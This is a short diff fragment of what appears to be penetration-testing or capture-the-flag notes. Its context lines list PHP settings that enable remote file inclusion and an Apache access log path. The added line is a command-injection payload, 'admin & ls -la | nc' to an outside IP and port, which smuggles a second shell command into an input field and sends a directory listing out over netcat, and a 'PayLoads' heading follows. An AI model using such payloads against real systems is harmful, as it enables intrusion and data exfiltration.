@@ -8,6 +8,7 @@ allow_url_fopen = on
 allow_url_include = on
 
 /var/log/apache2/access.log
+admin &  ls -la | nc 10.11.99.141 8888 # OS command 
 ```
 ## PayLoads
 
